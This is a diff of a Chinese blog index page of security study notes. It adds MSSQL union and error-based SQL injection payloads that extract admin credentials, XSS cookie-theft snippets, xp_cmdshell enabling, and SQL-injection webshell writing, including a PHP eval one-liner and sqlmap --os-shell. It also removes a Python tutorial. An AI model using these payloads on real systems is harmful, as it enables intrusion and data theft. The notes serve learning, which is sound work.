@@ -152,19 +152,173 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-安全进阶/MSSSQL和Oracle的手工注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-安全进阶/Oracle的手工注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MSSSQL和Oracle的手工注入</a>
+      <a class="article-title" href="/2021/04/29/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/Oracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">Oracle的手工注入</a>
     </h1>
   
 
         
-        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+        <a href="/2021/04/29/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/Oracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-04-29T07:24:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Oracle的基本知识"><a href="#Oracle的基本知识" class="headerlink" title="Oracle的基本知识"></a>Oracle的基本知识</h2><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/29/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/Oracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全进阶/XSS注入原理与实践进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">XSS注入原理与实践进阶</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-04-27T12:53:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>需要一个前端页面，能够给用户进行输入用户信息</p>
+<p>需要有一个后端页面，能够接收用户输入，并且将用户对应信息输出。</p>
+<p>流量劫持：将A站的流量引流到B站。原来要访问A，结果访问B。</p>
+<p>window.location.href=b</p>
+<p>获取用户cookie</p>
+<p>document.cookie</p>
+<p>篡改、删除页面信息(钓鱼)</p>
+<p>document.getElementByTagName(body)[0].innerhtml=’’将原有页面内容置空，变成一个空页面。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全进阶/MSSSQL的手工注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MSSSQL的手工注入</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
   	<time datetime="2021-04-24T01:45:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
 </a>
         
@@ -189,7 +343,93 @@ select ISNULL(NULL,123)    -- 查询结果为123</code></pre>
 <p>name列存放着数据库名。</p>
 <pre><code class="sql">select name from master..sysdatabases;
 select name from master.dbo.sysdatabases;</code></pre>
-<p>（2）</p>
+<p>（2）sysobjects表：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。以下是此系统表的字段名称和相关说明。</p>
+<ul>
+<li><strong>Name，id，xtype，uid，status</strong>：分别是对象名，对象ID，对象类型，所有者对象的用户ID，对象状态。当xtype=’U’ and status&gt;0代表是用户建立的表，对象名就是表名，对象ID就是表的ID值。</li>
+<li>name列 存放着数据库的所有的表名 。</li>
+</ul>
+<pre><code class="sql">select name from sysobjects where xtype=&#39;U&#39;;
+select id from sysobjects where xtype=&#39;U&#39;;</code></pre>
+<p>（3）syscolumns表：该表位于每个数据库中。主要字段有： <strong>name ，id， colid</strong> ；分别是字段名称，表ID号，字段ID号，<strong>其中的 ID 是用sysobjects得到的表的ID号。</strong>name列存放着数据库的所有的列名</p>
+<pre><code class="sql">select name from syscolumns;
+
+-- 限定结果：
+select name from syscolumns where id=(select id from 数据库名..sysobjects where name=&#39;表名&#39;)</code></pre>
+<h2 id="MSSQL联合查询"><a href="#MSSQL联合查询" class="headerlink" title="MSSQL联合查询"></a>MSSQL联合查询</h2><p>（1）判断列数：order by N</p>
+<p>（2）判断数据回显位置 union select </p>
+<ul>
+<li>union select：会把重复项去除</li>
+<li>union all select：全显示</li>
+<li>union select null,null,null…</li>
+</ul>
+<p>（3）获取任意一行的方式</p>
+<pre><code class="sql">-- 获取前m行的数据，然后丢弃，再向下获取n行的数据
+select top n username from users where username not in (select top m username from users);
+
+-- 多个列拼接到一个列查询的方式
+select username+&#39;.&#39;+password from users;</code></pre>
+<h3 id="语句构造"><a href="#语句构造" class="headerlink" title="语句构造"></a>语句构造</h3><p>（1）UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同数量的列</strong>。列也必须拥有<strong>相同的数据类型。</strong>当UNION之前的select语句结果集为空时，<strong>查询结果将由UNION后的SELECT语句控制。</strong></p>
+<p><img src="https://i.loli.net/2021/04/29/OhNUvZpQjostDn8.png" alt="image-20210429161933859"></p>
+<p>（2）MSSQL数据库为强类型，union的查询类型要相同。例如原有查询语句由6列，可先将6个位置都设置为字符串类型’1’,’2’,’3’,’4’,’5’,’6’，根据报错信息逐个修改数据类型，最后得出每个位置的数据类型。</p>
+<p>（3）若提交后提示”text 数据类型不能选为 DISTINCT，因为它不可比”的错误，产生这一错误的原因是<strong>union语句合并查询时是默认去除重复项的，也就是默认执行了distinct操作。</strong>将union 改为 <strong>union all</strong> 不去除重复项，就能够解决这个报错。</p>
+<p>（4）判断数据回显位置时，需要先将原有查询语句置空。可以将union all后的某些位置改为字符串以确认该位置是否回显。</p>
+<p>（5）确定列数和回显位置后，即可在回显位置写入查询语句以获取需要的信息。</p>
+<ul>
+<li>获取当前数据库名称</li>
+</ul>
+<pre><code class="sql"> 1%&#39; union all select &#39;1&#39;,db_name(),&#39;3&#39;,&#39;4&#39;,5,6 --</code></pre>
+<ul>
+<li>获取所有数据库的名称</li>
+</ul>
+<pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from master..sysdatabases --</code></pre>
+<ul>
+<li>获取关键数据库中的表名信息</li>
+</ul>
+<pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from ST_WebCourse..sysobjects where xtype=&#39;U&#39; --</code></pre>
+<ul>
+<li>获取关键表中的列名信息</li>
+</ul>
+<pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from ST_Webcourse..syscolumns where id=(select id from ST_Webcourse..sysobjects where name=&#39;ST_admin&#39;) --</code></pre>
+<ul>
+<li>获取列名中的关键数据</li>
+</ul>
+<pre><code class="sql">1%&#39; union all select &#39;1&#39;,admin,&#39;3&#39;,&#39;4&#39;,5,6 from ST_admin -- 
+1%&#39; union all select &#39;1&#39;,pass,&#39;3&#39;,&#39;4&#39;,5,6 from ST_admin  -- </code></pre>
+<h2 id="MSSQL报错注入"><a href="#MSSQL报错注入" class="headerlink" title="MSSQL报错注入"></a>MSSQL报错注入</h2><p>（1）构造报错注入语句的基本步骤：</p>
+<p><img src="https://i.loli.net/2021/04/29/iPQkc8Xvyl3UVbW.png" alt="image-20210429170941757"></p>
+<p>（2）常见报错注入方式：mssql数据库对我们输入的语句进行查询的时候，<strong>通过int数据类型转换出错,回显出我们需要的结果。</strong></p>
+<p>（3）常见拼接方式：通过判断原始条件真，用and拼接注入语句</p>
+<p>（4）获取数据：</p>
+<ul>
+<li>判断数据库版本信息</li>
+</ul>
+<pre><code class="sql"> and 1=(select @@version)</code></pre>
+<ul>
+<li>获取当前数据库用户</li>
+</ul>
+<pre><code class="sql">and 1=(select current_user)</code></pre>
+<ul>
+<li>获取数据库名信息</li>
+</ul>
+<pre><code class="sql">1%&#39; and 1=(select top 1 name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases))  --</code></pre>
+<ul>
+<li>获取当前数据库名信息</li>
+</ul>
+<pre><code class="sql">1%&#39; and 1=(select db_name()) –- </code></pre>
+<ul>
+<li>获取关键数据库中的表名信息</li>
+</ul>
+<pre><code class="sql">1%&#39; and 1=(select top 1 name from ST_WebCourse..sysobjects where xtype=&#39;U&#39; and name not in (select top 5 name from ST_WebCourse..sysobjects where xtype=&#39;U&#39;))  -- </code></pre>
+<ul>
+<li>获取关键表名中的列名信息</li>
+</ul>
+<pre><code class="sql">1%&#39; and 1=(select top 1 name from ST_WebCourse..syscolumns where id=(select id from ST_WebCourse..sysobjects where name=&#39;ST_Admin&#39;) and name not in (select top 2 name from ST_WebCourse..syscolumns where id=(select id from ST_WebCourse..sysobjects where name=&#39;ST_Admin&#39;)))-- 
+
+-- 注：此处的ST_Admin可能需要进行16进制编码处理，而且最好使用的是SQL_En的方式。可以使用小葵进行编码处理</code></pre>
+<ul>
+<li>获取关键表中的关键字段的值</li>
+</ul>
+<pre><code class="sql">1%&#39; and 1=(select top 1 pass from ST_admin where pass not in (select top 0 pass from ST_Admin))  --</code></pre>
 <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>MSSQL（Microsoft SQL) = SQL server</p>
 <p>PHP连接MySQL数据库、MSSQL数据库流程一致</p>
 <pre><code>mysqli_connect mysqli_query mysqli_fetch_array
@@ -217,7 +457,7 @@ select name from master.dbo.sysdatabases
 也可以默认操作源
 select name from master..sysdatabases</code></pre>
 <p>mssql中没有group_concat、limit，若查询结果有多行，可用top n可以取到前n行的数据，若要查询指定行的数据：</p>
-<pre><code class="sql">--先查询m行的数据，然后把该数据丢弃，向下再查询n行的数据。例如：查询第2行的数据。
+<pre><code class="sql">-- 先查询m行的数据，然后把该数据丢弃，向下再查询n行的数据。例如：查询第2行的数据。
 select top 1 usernam from users where username not in (select top 1 username from users);</code></pre>
 <p>获取到数据库名称后，查询该数据库的所有表的名称</p>
 <pre><code class="sql">select name from db_name..sysobjects where xtype=&#39;U&#39;</code></pre>
@@ -292,7 +532,7 @@ select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">展开全文 >></a>
         </p>
       
 
@@ -628,7 +868,7 @@ id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串
 ......</code></pre>
 <p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p>
 <p>字母a-z：97-122，MySQL对大小写不敏感</p>
-<p>数字0-1:448-57</p>
+<p>数字0-1:48-57</p>
 <p>下划线：95</p>
 <p><strong>时间型盲注</strong>：</p>
 <p>if()函数。</p>
@@ -1305,14 +1545,46 @@ id=2 CHAR(97, 110, 100, 32, 49, 61, 49)返回正常</code></pre>
 <p>Linux下：修改my.cnf在[mysqld]内加入secure_file_priv=</p>
 <p>（2）然后重启mysql，再查询secure_file_priv</p>
 <pre><code>show variables like &#39;%secure%&#39;;
-//值为null，表示限制mysqld不允许导入/导出
+//若secure_file_priv值为null，表示限制mysqld不允许导入/导出
 //值为/tmp/，表示限制mysqld的导入/导出只能发生在/tmp/目录下
-//值没有具体值时，表示不对mysqld的导入/导出做限制。</code></pre>
-<h2 id="SQL注入利用-执行命令"><a href="#SQL注入利用-执行命令" class="headerlink" title="SQL注入利用-执行命令"></a>SQL注入利用-执行命令</h2><p>（1）当数据库是SQL SERVER的时候可以利用xp_cmdshell存储过程执行系统命令。需要执行以下语句开启xp_cmdshell存储过程。</p>
-<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 
-1;RECONFIGURE;</code></pre>
+//若secure_file_priv值没有具体值时，表示不对mysqld的导入/导出做限制。</code></pre>
+<p>（3）读文件：select load_file(“xxx”)</p>
+<p>写文件：select xxx into outfile、select xxx into dumpfile。outfile可以写入多行，dumpfile只能写入一行。</p>
+<p>利用SQL注入写入一句话木马。需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</p>
+<pre><code class="sql">select &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &quot;D:\\flag.php&quot;;  -- widows下路径要加双斜杠，第一个斜杠表示转义</code></pre>
+<h2 id="SQL注入利用-执行命令"><a href="#SQL注入利用-执行命令" class="headerlink" title="SQL注入利用-执行命令"></a>SQL注入利用-执行命令</h2><p>（1）当数据库是<strong>SQL SERVER</strong>的时候可以利用xp_cmdshell存储过程执行系统命令。在数据库中需要执行以下语句开启xp_cmdshell存储过程。</p>
+<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
+EXEC sp_configure &#39;xp_cmdshell&#39;, 
+1;
+RECONFIGURE;</code></pre>
 <p><img src="https://i.loli.net/2021/04/25/AdeurYM6LOmqEZv.png" alt="image-20210425200005888"></p>
 <p>（2）开启之后使用xp_cmdshell可以执行系统命令，如下图所示使用该存储过程可以添加一个管理员组的用户</p>
+<h2 id="扩展：SQL注入写马"><a href="#扩展：SQL注入写马" class="headerlink" title="扩展：SQL注入写马"></a>扩展：SQL注入写马</h2><p><strong>大前提：需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</strong></p>
+<h3 id="利用SQLMAP写马"><a href="#利用SQLMAP写马" class="headerlink" title="利用SQLMAP写马"></a>利用SQLMAP写马</h3><p>payload：</p>
+<pre><code>sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --file-write &quot;Content&quot; --file-dest &quot;Path&quot;
+sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --os--shell</code></pre>
+<h3 id="利用语句写马"><a href="#利用语句写马" class="headerlink" title="利用语句写马"></a>利用语句写马</h3><p>前提：secure_file_priv变量值不为NULL，为网站根目录</p>
+<p>MySQL版本：</p>
+<pre><code>MySQL&lt;5.6.34：secure_file_priv可以使用set global secure_file_priv=&quot;path&quot;修改
+MySQL&gt;5.6.34：secure_file_priv不可以使用set global secure_file_priv=&quot;path&quot;修改，且参数默认值为NULL</code></pre>
+<p>payload：</p>
+<pre><code>id=-1&#39; union select &quot;Contents&quot; into outfile &quot;Paht&quot;
+id=-1&#39; union select &quot;Contents&quot; into dumpfile &quot;Path&quot;
+id=1&#39; into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+
+select * from admin where id=&#39;1&#39; into outfile &#39;path&#39; lines terminated by &#39;contents&#39;
+id=1&#39; limit 1 into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+</code></pre>
+<p>tips：</p>
+<pre><code>outfile可以写入多行数据，并且字段和行终止符都可以作为格式输出。
+dumpfile只能写一行，并且输出中不存在任何格式。</code></pre>
+<h3 id="利用日志写马"><a href="#利用日志写马" class="headerlink" title="利用日志写马"></a>利用日志写马</h3><pre><code>set global general_log=&quot;ON&quot;
+set global general_log_file=&quot;Path&quot;
+union select 查询</code></pre>
+<p>过滤：preg_match正则匹配 </p>
+<pre><code>preg_match(&#39;unon&#39;,$sql)&#123;
+
+&#125;</code></pre>
+<p>编码：宽字节注入</p>
+<p>预编译：mysqli_pdo</p>
 
       
 
@@ -2496,8 +2768,9 @@ Required-by:</code></pre>
 <p>（12）pip可以安装超过90%以上的第三方库。在Windows下，还有一些第三方库无法用pip安装，此时，需要其他的安装方法。而在Linux和Mac OS X等操作系统中，pip工具几乎可以安装任何第三方库。</p>
 <h4 id="扩展：Windows下的pip换源"><a href="#扩展：Windows下的pip换源" class="headerlink" title="扩展：Windows下的pip换源"></a>扩展：Windows下的pip换源</h4><p>在C:\Users\86177路径下新建pip文件夹，在pip文件夹下新建文件pip.ini，在该文件中填入以下内容：</p>
 <pre><code>[global]
-index-url = https://pypi.douban.com/simple
-trusted-host = pypi.douban.com</code></pre>
+index-url = http://mirrors.aliyun.com/pypi/simple/
+[install]
+trusted-host=mirrors.aliyun.com</code></pre>
 <h2 id="自定义安装"><a href="#自定义安装" class="headerlink" title="自定义安装"></a>自定义安装</h2><p>（1）自定义安装指按照第三方库提供的步骤和方式安装。<strong>第三方库都有主页用于维护库的代码和文档</strong>。以科学计算用的numpy为例，开发者的维护官方主页:<a target="_blank" rel="noopener" href="http://www.numpy.org/">http://www.numpy.org/</a></p>
 <p>（2）浏览网页后找到下载链接，进而根据提示步骤安装。<strong>自定义安装一般适合用于pip中尚无登记或安装失败的第三方库。</strong></p>
 <h2 id="文件安装"><a href="#文件安装" class="headerlink" title="文件安装"></a>文件安装</h2><p>（1）由于Python某些第三方库仅提供源代码，通过pip下载文件后无法在Windows系统编译安装，会导致第三方库安装失败。<strong>在Windows平台下所遇到的无法安装第三方库的问题大多属于这类</strong>。</p>
@@ -2818,466 +3091,6 @@ mysql -u root -p</code></pre>
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/04/09/deepin/deepin%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/运用Python语言(一)-程序设计方法论01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/08/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA01/">运用Python语言(一)-程序设计方法论01</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/08/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA01/" class="archive-article-date">
-  	<time datetime="2021-04-08T12:48:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="计算思维"><a href="#计算思维" class="headerlink" title="计算思维"></a>计算思维</h2><p>（1）计算思维的本质是<strong>抽象（Abstraction）</strong>和<strong>自动化（Automation）</strong>。</p>
-<p>（2）人类在认识世界、改造世界过程中表现出的思维特征：</p>
-<ul>
-<li>以实验和验证为特征的实证思维，以物理学科为代表</li>
-<li>以推理和演绎为特征的逻辑思维，以数学学科为代表</li>
-<li>以设计和构造为特征的计算思维，以计算机学科为代表</li>
-</ul>
-<p>（3）在程序设计范畴，计算思维主要反映在：</p>
-<ul>
-<li>理解问题的计算特性</li>
-<li>将计算特性抽象为计算问题</li>
-<li>通过程序设计语言实现问题的自动求解</li>
-</ul>
-<p><strong>扩展：</strong>ENIAC是世界上第一台通用计算机，于1946年诞生于美国宾夕法尼亚大学摩尔实验室。</p>
-<h2 id="体育竞技分析"><a href="#体育竞技分析" class="headerlink" title="体育竞技分析"></a>体育竞技分析</h2><p>（1）<strong>模拟</strong>是用来解决现实世界问题的重要手段和技术</p>
-<p>（2）模拟与仿真：</p>
-<ul>
-<li>模拟(simulation)是抽象原系统某些行为特征并用另一系统来表示这些特征的过程。常用于设计初期的模拟验证。</li>
-<li>仿真(emulation)则更进一步，需要模仿系统真实能做的事情，接受同样的数据，获得同样的结果，只是实现的过程不同。一般用于处理兼容性问题或在资源有限的条件下实现系统原型。</li>
-</ul>
-<p>（3）问题的IPO描述如下：</p>
-<ul>
-<li>输入：两个球员（球员A和球员B）的能力概率，模拟比赛的场次</li>
-<li>处理：模拟比赛过程</li>
-<li>输出：球员A和球员B分别赢得球赛的概率</li>
-</ul>
-<h2 id="自顶向下和自底向上"><a href="#自顶向下和自底向上" class="headerlink" title="自顶向下和自底向上"></a>自顶向下和自底向上</h2><p>要点：程序设计需要采用<strong>自顶向下</strong>的<strong>设计方法</strong>，采用<strong>自底向上</strong>的<strong>执行方法</strong></p>
-<p>自顶向下的设计方法，其基本思想是：</p>
-<ul>
-<li>以一个总问题开始，试图把它表达为很多小问题组成的解决方案</li>
-<li>再用同样的技术依次攻破每个小问题，最终问题变得非常小，以至于可以很容易解决</li>
-<li>最后只需把所有的碎片组合起来，就可以得到一个程序</li>
-</ul>
-<h3 id="自顶向下设计"><a href="#自顶向下设计" class="headerlink" title="自顶向下设计"></a>自顶向下设计</h3><h4 id="1-顶层设计"><a href="#1-顶层设计" class="headerlink" title="1.顶层设计"></a>1.顶层设计</h4><p>（1）以体育竞技分析为例，从问题的IPO描述开始，以下是一个基础设计的4个步骤：</p>
-<ul>
-<li>步骤1：打印程序的介绍性信息</li>
-<li>步骤2：获得程序运行需要的参数，即probA、proB、n</li>
-<li>步骤3：利用球员A和B的的能力值proA和proB，模拟n次比赛</li>
-<li>步骤4：输出球员A和球员B获胜比赛的场次和概率</li>
-</ul>
-<p>以上的基础设计是从IPO描述获得，可以作为<strong>自顶向下的顶层设计</strong></p>
-<p>（2）步骤1输出一些介绍信息，下面是该步骤的Python代码，<strong>顶层设计一般不给出具体代码，仅给出函数定义</strong>。</p>
-<pre><code class="python">def main():
-    printIntro()      #pirntIntro()函数打印一些必要的说明</code></pre>
-<p>（3）步骤2获得用户输入。<strong>通过函数将输入语句及输入格式等细节封装或隐藏，</strong>只需假设程序如果调用了getInputs()函数即可获取变量probA、probB和n的值。这个函数必须为主程序返回这些值。</p>
-<pre><code class="python">def main():
-    printIntro()
-    probA, probB, n = getInputs()</code></pre>
-<p>（4）步骤3需要使用probA、probB模拟n场比赛。可类似步骤2，设计一个simNGames()函数来模拟n场比赛，并返回结果。按要求，<strong>该函数需要模拟n场比赛，并给出球员A和球员B赢得比赛的结果。</strong></p>
-<pre><code class="python">def main():
-    printIntro()
-    probA, probB, n = getInputs()
-    winsA, winsB = simNGames(n, probA, probB)</code></pre>
-<p>（5）步骤4输出结果，仍然只规划功能和函数。</p>
-<pre><code class="python">def main():
-    printIntro()
-    probA, probB, n = getInputs()
-    winsA, winsB = simNGames(n, probA, probB)
-    printSummary(winsA, winsB)</code></pre>
-<p>（6）完成以上4个步骤后，程序<strong>框架</strong>已经清晰，但main()函数并没有做什么。原问题被划分为4个独立的函数：printIntro()、getInputs()、simNGames()和printSummary()。并且这些函数名称、输入参数和预期返回值都已确定。</p>
-<p><img src="https://i.loli.net/2021/04/10/LESiWt7gCAjchs5.png" alt="image-20210410115248745"></p>
-<h4 id="2-第n层设计"><a href="#2-第n层设计" class="headerlink" title="2.第n层设计"></a>2.第n层设计</h4><p>（1）经过顶层设计，main()函数成为体育竞技分析的顶层结构，该设计可表示为上图，其中每层按照从左至右的顺序执行。连接两个矩形之间的线表示上面函数对下面函数的调用关系。箭头表示函数之间的输入和输出。</p>
-<p>（2）每层设计中，<strong>参数和返回值如何设计是重点</strong>。<strong>确定事件的重要特征而忽略其他细节过程称为抽象。</strong></p>
-<p>（3）<strong>自顶向下设计的第二阶段是实现或进一步抽象第二层函数。</strong></p>
-<p>（4）printIntro()函数应该输出一个程序介绍，这个功能的代码如下：</p>
-<pre><code class="python">def printIntro():
-    print(&quot;这个程序模拟两个选手A和B的某种竞技比赛&quot;)
-    print(&quot;程序运行需要A和B的能力值(以0到1之间的小数表示)&quot;)</code></pre>
-<p>（5）getInputs()函数根据提示得到3个需要返回主程序的值，代码如下：</p>
-<pre><code class="python">def getInputs():
-    a = eval(input(&quot;请输入选手A的能力值（0-1）：&quot;))
-    b = eval(input(&quot;请输入选手B的能力值（0-1）：&quot;))
-    n = eval(input(&quot;模拟比赛的场次：&quot;))
-    return a, b, n</code></pre>
-<p>（6）simNGames()函数是整个程序的核心，<strong>其基本思路是模拟n场比赛，并跟踪记录每个球员赢得了多少比赛。</strong>”模拟n场比赛“直观感受像一个<strong>计数循环</strong>，而跟踪记录获胜场次更像<strong>计数过程</strong>。代码如下：</p>
-<pre><code class="python">def simNGames(n, probA, probB):
-    winsA, winsB = 0, 0
-    for i in range(n):
-        sorceA, sorceB = simOneGame(probA,probB)
-        if sorceA &gt; sorceB:
-            winsA += 1
-        else:
-            winsB += 1
-    return winsA, winsB</code></pre>
-<p>（7）代码中设计了simOneGame()函数，用于模拟一场比赛，**这个函数需要知道每个球员的的能力值，返回两个球员的得分，该设计对整体设计的更新如下：</p>
-<p><img src="https://i.loli.net/2021/04/10/786Y1FbcQviez3o.png" alt="image-20210410124832003"></p>
-<p>（8）实现simOneGame()函数。</p>
-<ul>
-<li>根据比赛规则，两个球员要持续对攻直至比赛结束，可以采用无限循环直到比赛结束条件成立。</li>
-<li>记录比赛得分，保留发球局标记。</li>
-<li>通过随机数和概率，可以确定发球方是否赢得了比分(random()&lt;prob)</li>
-<li>若球员A发球，则需要使用A的概率，接着根据发球的结果，更新是球员A等分还是将球权交给B。</li>
-</ul>
-<p>代码如下：</p>
-<pre><code class="python">def simOneGame(probA, probB):
-    sorceA, sorceB = 0, 0
-    serving = &quot;A&quot;
-    while not gameOver(sorceA,sorceB):
-        if serving == &quot;A&quot;:
-            if random() &lt; probA:
-                sorceA += 1
-            else:
